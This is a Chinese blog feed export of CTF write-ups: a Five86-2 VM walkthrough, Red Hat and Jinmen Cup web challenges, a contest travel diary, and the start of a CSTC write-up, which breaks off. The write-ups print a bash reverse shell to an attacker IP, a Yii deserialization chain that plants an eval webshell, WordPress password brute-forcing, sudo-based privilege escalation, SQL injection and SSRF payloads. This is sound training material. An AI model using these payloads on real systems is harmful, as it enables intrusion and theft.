src="https://i.loli.net/2021/05/14/drFCt83HUP5DegE.jpg"></p><p>sudo -l 发现可以以 jen 的身份执行 cp 命令：</p><p><img src="https://i.loli.net/2021/05/14/6FVjiADQZuWY8Id.jpg"></p><p>所以我们可以写入 jen 的 authorized_keys 来包含 douglas 的公钥，从而直接用 douglas 的 id_rsa 免密 ssh 登录 jen，因为 jen 没有权限访问 douglas，而 douglas 也亦然，所以先丢到 /tmp，再转。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp ~/.ssh/id_rsa.pub /tmp/authorized_keys</span><br><span class="line">chmod 777 /tmp/authorized_keys</span><br><span class="line">sudo -u jen /bin/cp /tmp/authorized_keys /home/jen/.ssh/</span><br><span class="line">ssh -i id_rsa jen@127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/14/dbGzqjw1trkXy3s.jpg"></p><p>还可以发现一个 mail，看一下：</p><p><img src="https://i.loli.net/2021/05/14/9wqnAT3EsrU5e4t.jpg"></p><p>获取到了 moss 用户的密码，登上：</p><p><img src="https://i.loli.net/2021/05/14/rda38HnP6S5pfij.jpg"></p><p>家目录里面发现 .games/ 里面有提升权限的文件，直接执行：</p><p><img src="https://i.loli.net/2021/05/14/LwxjPEQHvTBUK68.png"></p><p>获得 root 权限：</p><p><img src="https://i.loli.net/2021/05/14/e4d3WR8wcLba9XV.jpg"></p><p>root 里面轻取 flag：</p><p><img src="https://i.loli.net/2021/05/14/2xlvmORPjBCTIt8.jpg"></p><h2 id="Five86-2"><a href="#Five86-2" class="headerlink" title="Five86-2"></a>Five86-2</h2><p>Nmap 扫：</p><p><img src="https://i.loli.net/2021/05/14/nrgfwdBFH7Wqkx5.png"></p><p>无法加载的话可以尝试在 C:\Windows\System32\drivers\etc\hosts 添加一条 <code>192.168.237.138 five86-2</code>（靶机 IP 自改）。</p><p>是 WordPress 框架，用 wpscan 爆破用户名：<code>wpscan --url &quot;http://192.168.237.138&quot; -e u</code></p><p><img src="https://i.loli.net/2021/05/14/tywcNYSPUJsLlnV.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">peter</span><br><span class="line">admin</span><br><span class="line">barney</span><br><span class="line">stephen</span><br><span class="line">gillian</span><br></pre></td></tr></table></figure><p>然后使用 kali 自带的 rockyou.txt 爆一下密码：（rockyou.txt 是由 rockyou.txt.gz 解压而来）（爆你🐎一年）</p><p><code>wpscan --url &quot;http://192.168.237.138&quot; -U user.txt -P /usr/share/wordlists/rockyou.txt</code></p><p><img src="https://i.loli.net/2021/05/14/vViWaf52dl8Jgns.png"></p><p>爆出来两对：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: barney, Password: spooky1</span><br><span class="line">Username: stephen, Password: apollo1</span><br></pre></td></tr></table></figure><p>可以利用 <a href="https://www.freebuf.com/vuls/205735.html%EF%BC%8C%E6%8F%92%E4%BB%B6%E4%BC%A0%E9%A9%AC%E3%80%82">https://www.freebuf.com/vuls/205735.html，插件传马。</a></p><p><img src="https://i.loli.net/2021/05/19/dqM8aRlOjfxvWVI.png"></p><p><img src="https://i.loli.net/2021/05/19/Xorw1b42TLCGy87.png"></p><p><img src="https://i.loli.net/2021/05/19/HE7dR5Nf4iKTSIl.png"></p><p>包含 111.php 与 index.html，111.php反弹一个 shell：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> exec(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.237.253/2333 0&gt;&amp;1&#x27;&quot;</span>);phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/19/PpTcRSDNJ6mUbzG.png"></p><p>利用之前爆出来的账户密码（stephen:apollo1）提权。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su stephen</span><br><span class="line">python3 -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/19/JnWDdif5eupOMAV.png"></p><p><code>ps -auxwww</code> 看一下跑的进程。</p><p><img src="https://i.loli.net/2021/05/19/PZdhlvFrRwMOfEa.png"></p><p>发现 paul 用户跑了个 ftp 上传的脚本。tcpdump 发现有多张网卡，尝试监听来获取用户名密码。    </p><p><img src="https://i.loli.net/2021/05/19/V8an2dloi7FyEAG.png"></p><hr><h3 id="tcpdump-常用参数及使用方法"><a href="#tcpdump-常用参数及使用方法" class="headerlink" title="tcpdump 常用参数及使用方法"></a>tcpdump 常用参数及使用方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-c：指定要抓取的包数量。</span><br><span class="line"></span><br><span class="line">-i interface：指定tcpdump需要监听的接口。默认会抓取第一个网络接口</span><br><span class="line"></span><br><span class="line">-n：对地址以数字方式显式，否则显式为主机名，也就是说-n选项不做主机名解析。</span><br><span class="line"></span><br><span class="line">-nn：除了-n的作用外，还把端口显示为数值，否则显示端口服务名。</span><br><span class="line"></span><br><span class="line">-P：指定要抓取的包是流入还是流出的包。可以给定的值为&quot;in&quot;、&quot;out&quot;和&quot;inout&quot;，默认为&quot;inout&quot;。</span><br><span class="line"></span><br><span class="line">-D：列出可用于抓包的接口。将会列出接口的数值编号和接口名，它们都可以用于&quot;-i&quot;后。</span><br><span class="line"></span><br><span class="line">-F：从文件中读取抓包的表达式。若使用该选项，则命令行中给定的其他表达式都将失效。</span><br><span class="line"></span><br><span class="line">-w：将抓包数据输出到文件中而不是标准输出。可以同时配合&quot;-G&quot; &quot;time&quot; 选项使得输出文件每time秒就自动切换到另一个文件。可通过&quot;-r&quot;选项载入这些文件以进行分析和打印。</span><br><span class="line"></span><br><span class="line">-r：从给定的数据包文件中读取数据。使用&quot;-&quot;表示从标准输入中读取。</span><br></pre></td></tr></table></figure><hr><p><img src="https://i.loli.net/2021/05/19/2mNkJy1uCKMbYgH.png"></p><p>我他马，真的烦si。抄一波师傅们的答案算了：<code>paul:esomepasswford</code>：</p><p><img src="https://i.loli.net/2021/05/19/2pURNmyEvLFZMwg.png"></p><p><code>sudo -l</code> 发现可以以 peter 身份执行 service，我们直接 <code>sudo -u peter service ../../bin/bash</code> 提权：</p><p><img src="https://i.loli.net/2021/05/19/UOBlHNtoF8kKfhC.png"></p><p><code>sudo -l</code> ，直接 passwd 改 root 密码：</p><p><img src="https://i.loli.net/2021/05/19/Rxh48O3PadGkH6g.png"></p><p><img src="https://i.loli.net/2021/05/19/WvAkua5Oldw2RIq.png"></p><p>完事。</p><p><img src="https://i.loli.net/2021/05/19/kQKUtMLF6RisHmV.png"></p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><h3 id="Nmap-相关"><a href="#Nmap-相关" class="headerlink" title="Nmap 相关"></a>Nmap 相关</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-sT -sS: 隐秘的TCP连接扫面，很可靠</span><br><span class="line">-A: 详细扫描</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 智慧的收藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_Red_Hat and WICCTF_WP</title>
      <link href="2021/05/09/2021-Red-Hat-and-WICCTF-WP/"/>
      <url>2021/05/09/2021-Red-Hat-and-WICCTF-WP/</url>
      
        <content type="html"><![CDATA[<p>还在安徽，直接在酒店里看了看题。</p><h2 id="红帽杯"><a href="#红帽杯" class="headerlink" title="红帽杯"></a>红帽杯</h2><h3 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h3><p>robots.txt，swp 源码泄露</p><p>flag 在 phpinfo</p><h3 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h3><p>Yii 的反序列化链</p><p>POC：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$modelClass</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&quot;file_put_contents(&#x27;1.php&#x27;, &#x27;&lt;?php eval(\$_POST[Du1]);&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mzp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NjoiYXNzZXJ0IjtzOjI6ImlkIjtzOjU1OiJmaWxlX3B1dF9jb250ZW50cygnMS5waHAnLCAnPD9waHAgZXZhbCgkX1BPU1RbRHUxXSk7Jyk7IjtzOjEwOiJtb2RlbENsYXNzIjtOO31pOjE7czozOiJydW4iO319fX0=</span></span><br></pre></td></tr></table></figure><p>about 里传入，写个🐎，Apache_mod_cgi 绕 disable_func，readflag 读取 flag。</p><h3 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h3><p>盲注得到管理员密码，payload：<code>^((ascii(substr((select(group_concat(password))from(users)),&#123;&#125;,1)))=&#123;&#125;)</code></p><p>SSRF 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;flag</span><br><span class="line">127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="ezlight"><a href="#ezlight" class="headerlink" title="ezlight"></a>ezlight</h3><p>占坑，垃圾某春秋十二点就急着关靶机，没来得及复现，先占个坑，Y1ng 师傅太QQQQQ了</p><p><a href="https://www.gem-love.com/websecurity/2763.html#0x01_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">https://www.gem-love.com/websecurity/2763.html#0x01_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0</a></p><h2 id="津门杯"><a href="#津门杯" class="headerlink" title="津门杯"></a>津门杯</h2><h3 id="power-cut"><a href="#power-cut" class="headerlink" title="power_cut"></a>power_cut</h3><p>swp 源码泄露。</p><p>反序列化，直接利用 logger 的 readfile 读取 flag，flag 被过滤，可以用双写绕过。</p><p><code>poc</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">logger</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logFile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$initMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$exitMsg</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">weblog</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weblogfile</span>=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> weblog()));</span><br></pre></td></tr></table></figure><p><code>payload</code>：</p><p><code>O%3A6%3A%22weblog%22%3A1%3A%7Bs%3A10%3A%22weblogfile%22%3Bs%3A5%3A%22%2Fflflagag%22%3B%7D</code></p><h3 id="hatephp"><a href="#hatephp" class="headerlink" title="hatephp"></a>hatephp</h3><p>php5，p师傅文章里提到过这个方法，@ 被过滤，用 ? 即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?code&#x3D;?&gt;&lt;?&#x3D;&#96;.%20&#x2F;???&#x2F;????????[?-[]&#96;;?&gt; HTTP&#x2F;1.1</span><br><span class="line">Host: 122.112.214.101:20004</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.93 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type:multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Length: 170</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;3.sh&quot;</span><br><span class="line"></span><br><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line"></span><br><span class="line">cat &#x2F;flag</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA--</span><br></pre></td></tr></table></figure><h3 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$url</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="variable">$a</span> = preg_match(<span class="string">&quot;/file|dict/i&quot;</span>, <span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span>==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$ch</span> = curl_init();</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]);</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">            curl_close(<span class="variable">$ch</span>);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ssrf 打 admin.php：<code>?url=http://121.36.147.29:20001/admin.php</code></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>铁三线下之旅</title>
      <link href="2021/05/07/%E9%93%81%E4%B8%89%E7%BA%BF%E4%B8%8B%E4%B9%8B%E6%97%85/"/>
      <url>2021/05/07/%E9%93%81%E4%B8%89%E7%BA%BF%E4%B8%8B%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<p>躺躺进了铁三线下，来安徽旅一波游。</p><h2 id="5-7"><a href="#5-7" class="headerlink" title="5.7"></a>5.7</h2><p><img src="https://i.loli.net/2021/05/07/BURJi9TtfVCajkA.jpg"></p><p>今天在实验室一直待到凌晨，叫了滴滴跑到长沙火车站，坐绿皮火车去武昌，卧铺嗷，卧铺，令人是无比期待，我们所期待的是这样的：</p><p><img src="https://i.loli.net/2021/05/07/fFlIXD4iHEN89Ah.png"></p><p>然后……现实是这样的：</p><p><img src="https://i.loli.net/2021/05/07/1Tr8ceGIbfA4quZ.jpg"></p><p>还就内个三层卧铺，顶级折磨，嗷，住在中层的👴只能躺着进去躺着出来。上床已经差不多是凌晨三点半了吧，都没咋睡，折腾到了四点多才闭眼，睡了大概两个小时就被乘务员喊起来了，说是还有二十分钟就到了，就下了床，直接跟没睡一样，然后中间还停了一段时间，就晚点了，差点赶不上八点的从武汉站到合肥的高铁🚝（总归是赶上了。</p><p><img src="https://i.loli.net/2021/05/07/9z2tj4CQFDwYrLx.jpg" alt="、"></p><p><img src="https://i.loli.net/2021/05/07/srwOyI1MpS4viAq.jpg"></p><p>这两图都在火车上拍的。</p><p>高铁上面一没靠窗，二就太困了😴，所以啥都没拍，直接闭目养神了一路。大概九点多总算是到了合肥。</p><p><img src="https://i.loli.net/2021/05/07/Wb5EXg8K24L7lHQ.jpg"></p><p>某蛮好看的建筑：</p><p><img src="https://i.loli.net/2021/05/07/Kpa2yBlVfnsF7kJ.jpg"></p><p>点名批评这里的老鸡汤面，太难吃了，浪费👴23块💰，哭哭。</p><p>住的酒店和比赛酒店还是比较近，也就隔壁的关系吧23333。</p><p><img src="https://i.loli.net/2021/05/07/5BgLtizdpVSNuWT.jpg"></p><p><img src="https://i.loli.net/2021/05/07/XKIhZwjL7vGJOPR.jpg"></p><p>下午打算去欢乐谷玩玩，彳亍。</p><p>笑死，这仨个人一个都没起来，玩个🐓儿。</p><p>晚上去吃了👴吃过的最难吃最坑💰的烧烤店，第一次尝到了最难吃的🌶炒🥩，最难吃的🐂🥩，最难吃的🍳炒饭，属实给👴整吐了，敢情👴是来排雷的呗。</p><p>吃完晚饭散步的时候才发现一个很奇怪的问题，👴忘记带网线转接头了。。。so 到处溜达，试图在手机专卖店里面买到电脑的网线转接头（误），最后找到了某联想，直接 -249（哭惨）。（关键前两次线下也忘了带，不长记性啊这人）</p><p><img src="https://i.loli.net/2021/05/07/qlVk3zpOWK4XvCx.jpg"></p><p>唯一能带来一点慰籍的就是小🐷了：</p><p><img src="https://i.loli.net/2021/05/07/dS3NfzvsVx2heDc.jpg"></p><p>准备看看溯源和渗透，希望明天别爆零吧 - -</p><p>Good night🌙</p><h2 id="5-8"><a href="#5-8" class="headerlink" title="5.8"></a>5.8</h2><p>徽面。</p><p><img src="https://i.loli.net/2021/05/08/nFhWkYlSZdygRLT.jpg"></p><p>形状还挺逆天的，口感还彳亍，只是没有碱面好吃。</p><p><img src="https://i.loli.net/2021/05/08/coLfFjgVw57xmlR.jpg"></p><p>大概八点进赛场了。</p><p><img src="https://i.loli.net/2021/05/08/kQ9FgopdP4hrvEC.jpg"></p><p><img src="https://i.loli.net/2021/05/08/va3lRrcE8LXZPJt.jpg"></p><p>中间比赛的过程还挺艰辛的，学到了很多，知道了溯源并不是想象中的那么难，最后是第十一名，还可以，回本了，小赚。</p><p>中饭都没吃 = =，很饿，待会吃顿好的，晚上出去转一转。</p><p>实在感谢 @老樊 @卓哥 @老谢 你们带我躺。</p><p><img src="https://i.loli.net/2021/05/08/yDwPXVYSv9QKGkt.jpg"></p><p>然后还和 @Guoke 师傅面了个基，guoke 太帅了（误。</p><p>在之后就去了据说是合肥人都咋咋咋的庐州太太吃晚饭。</p><p><img src="https://i.loli.net/2021/05/08/eavzXKdZix4Aj1l.jpg"></p><p><img src="https://i.loli.net/2021/05/08/W1mxOSXudEA6siw.jpg"></p><p><img src="https://i.loli.net/2021/05/08/v8TWqiwfB69AjnK.jpg"></p><p>虽然确实花了比昨晚少的💴，吃到了昨晚好吃太多的饭菜，但是这屌饭店的上菜速度确实折磨人，菜还没上齐就差不多饱了（恼。</p><p>完事以后逛了一波商场，说是要买好吃的啥的，还有帽子，最后就我和老谢一人买了一只🐷。</p><p><img src="https://i.loli.net/2021/05/08/gAIe1xqnvSfBY4W.jpg"></p><p>彳亍，回酒店休息了，床太舒服了。</p><h2 id="5-9"><a href="#5-9" class="headerlink" title="5.9"></a>5.9</h2><p>一觉睡到 10 点，如果不是有比赛还可以继续睡🛏。</p><p>老樊老谢直接跑出去玩去了，和卓哥打到快两点的时候去吃了顿饭，又不信邪去吃了次第一天吃的店子。</p><p><img src="https://i.loli.net/2021/05/09/KIlSPANmgEZzRp7.jpg"></p><p>好看是挺好看，但是就是少了味道（烦死了。</p><p>下午继续卑微做题，一个人打两场比赛（队友呢，救救啊，别演了。</p><p>吃了隔壁的老乡鸡，很离谱的是一堆人对着导航半天，都说明明到了（指自家酒店门口），为什么没找到，转头一看就在隔壁（瞎。</p><p><img src="https://i.loli.net/2021/05/09/3H6vYGFci2TEnmL.jpg"></p><p><img src="https://i.loli.net/2021/05/09/FimjJQ7zeslVZCI.jpg"></p><p>人手一瓶营养快线，干~</p><p><img src="https://i.loli.net/2021/05/09/thF9MNdV6IDXRCv.jpg"></p><p>然后第二轮，嗦面（什么叫上当，再也不会吃徽面了，我不该对徽面有这样的信心。&lt;仅代表个人观点&gt;</p><p><img src="https://i.loli.net/2021/05/09/OPYVjdyR4pTGbH8.jpg" alt="@4PF9_N_O_GASGI_V_APZF5.jpg"></p><p>表情包怎么说，夺笋啊。</p><p><img src="https://i.loli.net/2021/05/09/CPaSnvAGditTp5u.jpg"></p><p>吃完和老谢骑小电动到处乱转，很舒服，第一次骑，直接起飞。</p><p><img src="https://i.loli.net/2021/05/09/dFUmtri58buJ6Io.jpg"></p><p>回来趴床上看了一波鬼灭，舒服之（只能说我太欣赏善逸的颜了。</p><p><img src="https://i.loli.net/2021/05/09/z9f3gqNZ6rjpcvh.jpg"></p><p><img src="https://i.loli.net/2021/05/09/C9p4GjevUO6q8Fm.jpg"></p><p>明天打算去外面转一转，放松放松，休息了休息了。</p><h2 id="5-10"><a href="#5-10" class="headerlink" title="5.10"></a>5.10</h2><p>去游乐场玩了半天，很他🐎爽，坐火车回了，贴张表情包，溜了溜了。</p><p><img src="https://i.loli.net/2021/05/11/mHoKCj98rXGP4xz.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 旅游记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
            <tag> 旅游 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_CSTC_WP</title>
      <link href="2021/05/06/2021-CSTC-WP/"/>
      <url>2021/05/06/2021-CSTC-WP/</url>
      
        <content type="html"><![CDATA[<p>五一假期结束太快了，早上起来想偷懒睡觉被 @LemonPrefect 师傅拖起来做题，中午想睡午觉被 @Guoke 师傅拖起来做题，最后是和师傅们一起 A 了四道 web（guoke 太猛了），晚上出去了最后没来得及做 web5，随便贴贴当时记录的文档吧，好像也没有复现了。</p><h2 id="ezweb"><a href="#ezweb" class="headerlink" title="ezweb"></a>ezweb</h2><p>简单的绕过，payload：</p><p><code>?foo=&#123;&quot;bar1&quot;:&quot;2022a&quot;,&quot;bar2&quot;:[[],2,3,4,5],&quot;a2&quot;:[&quot;nudt&quot;]&#125;&amp;cat[0]=%00cstc2021&amp;cat[1]=1&amp;dog[]=%00</code></p><h2 id="easyweb2"><a href="#easyweb2" class="headerlink" title="easyweb2"></a>easyweb2</h2><p><code>http://49.232.167.183:30013/swagger-resources/configuration/ui</code></p><p>好像是这个地方吧，可以看到所有路由，有个爆破UID的接口。通过爆破UID。得到900多的一个ctf_admin账号以及密码md5解密得到ctfer123!@#</p><p><code>curl -X GET &quot;http://49.232.167.183:30012/login?username=ctf_admin&amp;password=ctfer123!%40%23&quot;</code></p><p>获得 token：9c618e664319512ef7db2d3c0672bee0</p><p>然后 ssrf 访问 <code>ftp://localhost/flag.txt</code> 得到flag。</p><h2 id="ctfweb3"><a href="#ctfweb3" class="headerlink" title="ctfweb3"></a>ctfweb3</h2><p>访问 robots.txt，存在 <code>/PassOn/</code>，源码泄露：</p><p><code>http://49.232.3.115:49400/PassOn/PassOnbackupDirect0ry/info.php</code></p><p>style.css 中发现用户 Ptn4rdn <a 